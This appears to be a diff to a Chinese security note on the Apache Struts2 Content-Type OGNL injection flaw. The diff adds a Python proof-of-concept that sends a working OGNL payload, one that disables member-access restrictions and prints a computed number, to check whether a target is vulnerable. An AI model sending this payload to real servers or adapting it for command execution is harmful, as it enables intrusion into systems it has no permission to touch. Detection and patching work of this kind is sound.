@@ -41,7 +41,7 @@ l  删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）�
 包括sys, os, glob, socket, threading, _thread, queue, time, timeit, subprocess, multiprocessing, signal, select, shutil, tempfile等。
 大多数系统级接口集中在：sys和os两个模块。
 
->下面是测试PoC脚本
+>下面是测试PoC脚本1
 ```
 /usr/bin/env python
 # encoding:utf-8
@@ -61,4 +61,46 @@ def poc():
 
      
 poc()
+```
+
+
+>下面是测试PoC脚本1
+```
+import requests
+import sys
+ 
+def poc(url):
+
+    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
+
+    headers = {}
+
+    headers["Content-Type"] = payload
+
+    r = requests.get(url, headers=headers)
+
+    if b"105059592" in r.content:
+
+        return True
+ 
+
+    return False
+
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) == 1:
+
+        print ("py " + sys.argv[0] + " targetUrl")
+
+        sys.exit()
+
+    if poc(sys.argv[1])==True:
+
+        print ("vulnerable")
+
+    else:
+
+        print ("not vulnerable")
 ```
